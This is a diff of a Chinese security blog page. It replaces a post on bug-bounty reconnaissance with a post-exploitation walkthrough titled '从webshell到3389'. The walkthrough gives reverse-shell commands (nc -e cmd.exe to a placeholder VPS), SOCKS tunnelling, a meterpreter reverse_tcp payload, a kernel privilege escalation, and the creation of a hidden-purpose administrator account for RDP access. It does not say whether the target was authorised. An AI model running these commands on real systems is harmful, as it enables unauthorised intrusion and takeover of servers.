@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="渗透测试,SRC挖掘," />
+  <meta name="keywords" content="提权,内网渗透,端口与代理转发," />
 
 
 
@@ -79,21 +79,20 @@
 
 
 
-<meta name="description" content="何为SRCSRC(Security Response Center,安全应急响应中心)SRC导航 http://0xsafe.org/index.html 在此之前漏洞挖掘我也只是个新手，正在摸索中学习，可能有很多地方讲的不对，多多包涵。 浅谈SRC挖掘思路首先需要了解基本的企业安全，以及吸取前人经验。乌云在这方面算是做的蛮好的，可惜挂了。企业安全体系知识：WooYun WiKi:http://w">
-<meta name="keywords" content="渗透测试,SRC挖掘">
+<meta name="description" content="前言之前玩过一下linux下的提权，前段时间在上课的时候看了亮神的文章，感觉渗透还是不应该只停留在web层面。虽然说连WEB层面的东西都还没搞懂，但是还是想拓宽一下自己的攻击思路。当拿到了一个webshell之后，还能干什么呢？之前挖SRC，运气好也撞到过一个RCE，但是这些都只能停留在拿了shell之后，就不能再测下去了，后渗透这块，完全不清楚，虽然这次还是没有接触到域渗透，但是学了一些内网与代">
+<meta name="keywords" content="提权,内网渗透,端口与代理转发">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SRC挖掘思路">
-<meta property="og:url" content="https://legoc.github.io/2018/07/11/SRC挖掘思路/index.html">
+<meta property="og:title" content="从webshell到3389">
+<meta property="og:url" content="https://legoc.github.io/2019/05/18/从webshell到3389/index.html">
 <meta property="og:site_name" content="Mugen">
-<meta property="og:description" content="何为SRCSRC(Security Response Center,安全应急响应中心)SRC导航 http://0xsafe.org/index.html 在此之前漏洞挖掘我也只是个新手，正在摸索中学习，可能有很多地方讲的不对，多多包涵。 浅谈SRC挖掘思路首先需要了解基本的企业安全，以及吸取前人经验。乌云在这方面算是做的蛮好的，可惜挂了。企业安全体系知识：WooYun WiKi:http://w">
+<meta property="og:description" content="前言之前玩过一下linux下的提权，前段时间在上课的时候看了亮神的文章，感觉渗透还是不应该只停留在web层面。虽然说连WEB层面的东西都还没搞懂，但是还是想拓宽一下自己的攻击思路。当拿到了一个webshell之后，还能干什么呢？之前挖SRC，运气好也撞到过一个RCE，但是这些都只能停留在拿了shell之后，就不能再测下去了，后渗透这块，完全不清楚，虽然这次还是没有接触到域渗透，但是学了一些内网与代">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://legoc.github.io/2018/07/11/SRC挖掘思路/1.jpg">
-<meta property="og:image" content="https://legoc.github.io/2018/07/11/SRC挖掘思路/2.png">
-<meta property="og:updated_time" content="2018-07-11T03:55:55.129Z">
+<meta property="og:image" content="https://legoc.github.io/2019/05/18/从webshell到3389/1.png">
+<meta property="og:updated_time" content="2019-05-18T13:46:14.563Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SRC挖掘思路">
-<meta name="twitter:description" content="何为SRCSRC(Security Response Center,安全应急响应中心)SRC导航 http://0xsafe.org/index.html 在此之前漏洞挖掘我也只是个新手，正在摸索中学习，可能有很多地方讲的不对，多多包涵。 浅谈SRC挖掘思路首先需要了解基本的企业安全，以及吸取前人经验。乌云在这方面算是做的蛮好的，可惜挂了。企业安全体系知识：WooYun WiKi:http://w">
-<meta name="twitter:image" content="https://legoc.github.io/2018/07/11/SRC挖掘思路/1.jpg">
+<meta name="twitter:title" content="从webshell到3389">
+<meta name="twitter:description" content="前言之前玩过一下linux下的提权，前段时间在上课的时候看了亮神的文章，感觉渗透还是不应该只停留在web层面。虽然说连WEB层面的东西都还没搞懂，但是还是想拓宽一下自己的攻击思路。当拿到了一个webshell之后，还能干什么呢？之前挖SRC，运气好也撞到过一个RCE，但是这些都只能停留在拿了shell之后，就不能再测下去了，后渗透这块，完全不清楚，虽然这次还是没有接触到域渗透，但是学了一些内网与代">
+<meta name="twitter:image" content="https://legoc.github.io/2019/05/18/从webshell到3389/1.png">
 
 
 
@@ -123,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://legoc.github.io/2018/07/11/SRC挖掘思路/"/>
+  <link rel="canonical" href="https://legoc.github.io/2019/05/18/从webshell到3389/"/>
 
 
 
 
 
-  <title>SRC挖掘思路 | Mugen</title>
+  <title>从webshell到3389 | Mugen</title>
   
 
 
@@ -276,7 +275,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://legoc.github.io/2018/07/11/SRC挖掘思路/">
+    <link itemprop="mainEntityOfPage" href="https://legoc.github.io/2019/05/18/从webshell到3389/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="lego">
@@ -293,7 +292,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SRC挖掘思路</h1>
+          <h1 class="post-title" itemprop="name headline">从webshell到3389</h1>
         
 
         <div class="post-meta">
@@ -305,8 +304,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-11T10:16:49+08:00">
-                2018-07-11
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-18T19:57:38+08:00">
+                2019-05-18
               </time>
             
 
@@ -328,8 +327,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/SRC/" itemprop="url" rel="index">
-                    <span itemprop="name">SRC</span>
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
                   </a>
                 </span>
 
@@ -370,26 +369,60 @@
       
 
       
-        <h3 id="何为SRC"><a href="#何为SRC" class="headerlink" title="何为SRC"></a>何为SRC</h3><p>SRC(Security Response Center,安全应急响应中心)<br>SRC导航 <a href="http://0xsafe.org/index.html" target="_blank" rel="noopener">http://0xsafe.org/index.html</a></p>
-<h3 id="在此之前"><a href="#在此之前" class="headerlink" title="在此之前"></a>在此之前</h3><p>漏洞挖掘我也只是个新手，正在摸索中学习，可能有很多地方讲的不对，多多包涵。</p>
-<h3 id="浅谈SRC挖掘思路"><a href="#浅谈SRC挖掘思路" class="headerlink" title="浅谈SRC挖掘思路"></a>浅谈SRC挖掘思路</h3><p>首先需要了解基本的企业安全，以及吸取前人经验。<br>乌云在这方面算是做的蛮好的，可惜挂了。<br>企业安全体系知识：WooYun WiKi:<a href="http://wiki.secbug.net/" target="_blank" rel="noopener">http://wiki.secbug.net/</a><br>乌云镜像: <a href="http://www.anquan.us/" target="_blank" rel="noopener">http://www.anquan.us/</a><br>各大SRC厂商中，同程的SRC会公开漏洞也可以学习，借鉴。<a href="https://sec.ly.com/bugs" target="_blank" rel="noopener">https://sec.ly.com/bugs</a><br>基本的思路了解之后，开始尝试实践吧。</p>
-<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h5 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h5><p>首先对厂商的信息收集是非常的重要的。如果是刚入门的新手，主站可能挖不出来什么有价值，或者敏感的信息。我们可以尝试从厂商的子业务下手。子域名的收集有时候还是很重要的。我也是从这里挖到了人生的第一个SRC。<br>工具：layer,subDomainsBrute（<a href="https://github.com/lijiejie/" target="_blank" rel="noopener">lijiejie</a>大佬的，顺便安利下这个大佬，蛮多工具都很好用）<br>以及在线工具：<a href="http://z.duoluosb.com/" target="_blank" rel="noopener">http://z.duoluosb.com/</a> （chamd5的大佬的）</p>
-<h5 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h5><blockquote>
-<p>  语法</p>
-</blockquote>
-<pre><code>搜集域名和mail地址：
-搜集敏感文件：site:xxx.com filetype:doc
-
-搜集管理后台：site:xxx.com 管理／site:xxx.com admin／site:xxx.com login
-
-搜集mail：site:xxx.com intext:@xxx.com／intext:@xxx.com
-
-搜集敏感web路径：site:xxx.com intitle:登录／site:xxx.com inurl:sql.php
-</code></pre><p>两个强大的搜索引擎<a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a>和<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">zoomeye</a><br>以及之前Ricter师傅说过一个网站<a href="https://community.riskiq.com/" target="_blank" rel="noopener">RiskIQ</a></p>
-<h5 id="cms识别"><a href="#cms识别" class="headerlink" title="cms识别"></a>cms识别</h5><p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">云悉WEB资产梳理|在线CMS指纹识别平台</a></p>
-<h4 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h4><p>常规漏洞挖掘的话，和平常学习的思维差不多，就不多说了。</p>
-<h4 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h4><p>先附一张思维导图<br><img src="/2018/07/11/SRC挖掘思路/1.jpg" alt=""><br>密码找回漏洞挖掘思维导图<br><img src="/2018/07/11/SRC挖掘思路/2.png" alt=""></p>
-<h3 id="浅谈SRC挖掘学习"><a href="#浅谈SRC挖掘学习" class="headerlink" title="浅谈SRC挖掘学习"></a>浅谈SRC挖掘学习</h3><p>我在直接找SRC挖掘资料的过程中，发现网上在这方面的资料是蛮少的，这个东西怎么讲，不能说没有人分享，而是要具体事情具体分析，比如想挖其中的XSS，就要去找XSS挖掘思路,因为这个东西，大佬们也说不怎么好讲，经验的东西可能很重要，挖多了可能就会了。在学习过程中，一点点进步吧。</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前玩过一下linux下的提权，前段时间在上课的时候看了亮神的文章，感觉渗透还是不应该只停留在web层面。虽然说连WEB层面的东西都还没搞懂，但是还是想拓宽一下自己的攻击思路。当拿到了一个webshell之后，还能干什么呢？之前挖SRC，运气好也撞到过一个RCE，但是这些都只能停留在拿了shell之后，就不能再测下去了，后渗透这块，完全不清楚，虽然这次还是没有接触到域渗透，但是学了一些内网与代理之类的知识，还是做个小结为好。</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="一些信息"><a href="#一些信息" class="headerlink" title="一些信息"></a>一些信息</h2><p>首先</p>
+<p>拿到了一台服务器的webshell，这台机的状况</p>
+<ul>
+<li>只有一个内网IP</li>
+<li>webshell权限 nt authority\network service（非system）可以执行命令</li>
+<li>Microsoft Windows Server 2008 R2</li>
+<li>systeminfo 补丁到 [246]: KB4034733（补丁最后时间大概在2016年左右）</li>
+<li>不存在域</li>
+</ul>
+<p>由于在内网里面，很多操作需要用到代理。</p>
+<p>内网端口转发：阿烨师傅的文章 <a href="https://www.jianshu.com/p/735e8f1746f0" target="_blank" rel="noopener">https://www.jianshu.com/p/735e8f1746f0</a></p>
+<p>我个人使用了</p>
+<h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><p>我尝试了用连接 本机-vps-webshell</p>
+<p>ps:如果需要交互可以上传一个nc和cmd 反弹cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vul: nc -e cmd.exe yourvps 2333</span><br><span class="line">vps: nc -lvvp 2333</span><br></pre></td></tr></table></figure>
+<p>一般ew是会被杀，暂时没有了解免杀方面的知识</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vul: ew -s rssocks -d yourvps -e 2333</span><br><span class="line">vps: ./ew_for_linux64 -s rcsocks -l 1080 -e 2333</span><br></pre></td></tr></table></figure>
+<p>自己的电脑可以直接上个代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">地址: yourvps 2333</span><br></pre></td></tr></table></figure>
+<h2 id="reGeorg与Proxifier"><a href="#reGeorg与Proxifier" class="headerlink" title="reGeorg与Proxifier"></a>reGeorg与Proxifier</h2><p>详细可以看 <a href="https://xz.aliyun.com/t/228" target="_blank" rel="noopener">https://xz.aliyun.com/t/228</a></p>
+<p>上传tunnel.aspx</p>
+<p>访问显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Georg says, &apos;All seems fine</span><br></pre></td></tr></table></figure>
+<p>运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 9999 -u http://xxxxxx.com/tunnel.asp</span><br></pre></td></tr></table></figure>
+<p>设置代理服务器为9999</p>
+<p>设置好代理之后就可以3389链接了</p>
+<p>连接地址：vul的内网ip</p>
+<h2 id="上传meterpreter"><a href="#上传meterpreter" class="headerlink" title="上传meterpreter"></a>上传meterpreter</h2><p>渗透自然少不了metaspolit</p>
+<p>在拿了webshell之后，上次一个meterpreter上去会方便很多操作，</p>
+<p>可以参考亮神的Micro8</p>
+<p><a href="https://micro8.gitbook.io/micro8/contents-1/1-10/10msfvenom-chang-yong-sheng-cheng-payload-ming-ling" target="_blank" rel="noopener">https://micro8.gitbook.io/micro8/contents-1/1-10/10msfvenom-chang-yong-sheng-cheng-payload-ming-ling</a></p>
+<p>我在腾讯云上生成好像在运行的时候报错了，所以我直接在我的windows上生成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=yourvps LPORT=2334 -f exe &gt; payload.exe</span><br></pre></td></tr></table></figure>
+<p>在vps上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost yourvps</span><br><span class="line">set lport 2334</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>获取到会话</p>
+<p>关于meterpreter的操作可以参考先知社区的 <a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>meterpreter的某些操作需要足够的权限，以及我并没有一个可以登入3389的账户，webshell本身权限也不够，所以提权是必不可少的。</p>
+<p>同样的亮神的第一课和第二课都是关于提权的。</p>
+<p>windows下的提权</p>
+<p>对外公开的exp: <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<p>我选择了CVE-2018-8639来提权</p>
+<p><a href="https://github.com/ze0r/CVE-2018-8639-exp" target="_blank" rel="noopener">https://github.com/ze0r/CVE-2018-8639-exp</a></p>
+<p>exp.exe </p>
+<p>再whoami,权限变成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+<p>添加一个账户并且给他管理员</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test password /add</span><br><span class="line">net localgroup administrators test /add</span><br></pre></td></tr></table></figure>
+<p>reGeorg与Proxifier配合使用登入3389</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这次算是了解了一些内网方面的知识，因为环境有限没发现有其他可下一步内网漫游的方向，所以只能到此为止，有机会再看看能不能接触域渗透方面的知识。</p>
+<p>配个图：安利一个好工具冰蝎 <a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder</a></p>
+<p><img src="/2019/05/18/从webshell到3389/1.png" alt=""></p>
 
       
     </div>
@@ -410,7 +443,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://legoc.github.io/2018/07/11/SRC挖掘思路/" title="SRC挖掘思路">https://legoc.github.io/2018/07/11/SRC挖掘思路/</a>
+    <a href="https://legoc.github.io/2019/05/18/从webshell到3389/" title="从webshell到3389">https://legoc.github.io/2019/05/18/从webshell到3389/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -425,9 +458,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+            <a href="/tags/提权/" rel="tag"># 提权</a>
           
-            <a href="/tags/SRC挖掘/" rel="tag"># SRC挖掘</a>
+            <a href="/tags/内网渗透/" rel="tag"># 内网渗透</a>
+          
+            <a href="/tags/端口与代理转发/" rel="tag"># 端口与代理转发</a>
           
         </div>
       
@@ -440,8 +475,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/10/大二结束/" rel="next" title="时光会偷走你所有的美好">
-                <i class="fa fa-chevron-left"></i> 时光会偷走你所有的美好
+              <a href="/2019/05/01/用ceye来利用jsonp劫持/" rel="next" title="用ceye来利用jsonp劫持">
+                <i class="fa fa-chevron-left"></i> 用ceye来利用jsonp劫持
               </a>
             
           </div>
@@ -449,10 +484,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/07/13/致所有苦难/" rel="prev" title="致所有苦难">
-                致所有苦难 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -591,7 +622,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#何为SRC"><span class="nav-number">1.</span> <span class="nav-text">何为SRC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在此之前"><span class="nav-number">2.</span> <span class="nav-text">在此之前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#浅谈SRC挖掘思路"><span class="nav-number">3.</span> <span class="nav-text">浅谈SRC挖掘思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#信息收集"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#子域名收集"><span class="nav-number">3.1.1.</span> <span class="nav-text">子域名收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#google-hacking"><span class="nav-number">3.1.2.</span> <span class="nav-text">google hacking</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cms识别"><span class="nav-number">3.1.3.</span> <span class="nav-text">cms识别</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞挖掘</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逻辑漏洞"><span class="nav-number">3.3.</span> <span class="nav-text">逻辑漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#浅谈SRC挖掘学习"><span class="nav-number">4.</span> <span class="nav-text">浅谈SRC挖掘学习</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一些信息"><span class="nav-number">2.1.</span> <span class="nav-text">一些信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ew"><span class="nav-number">2.2.</span> <span class="nav-text">ew</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reGeorg与Proxifier"><span class="nav-number">2.3.</span> <span class="nav-text">reGeorg与Proxifier</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上传meterpreter"><span class="nav-number">2.4.</span> <span class="nav-text">上传meterpreter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权"><span class="nav-number">2.5.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后记"><span class="nav-number">3.</span> <span class="nav-text">后记</span></a></li></ol></div>
             
 
           </div>
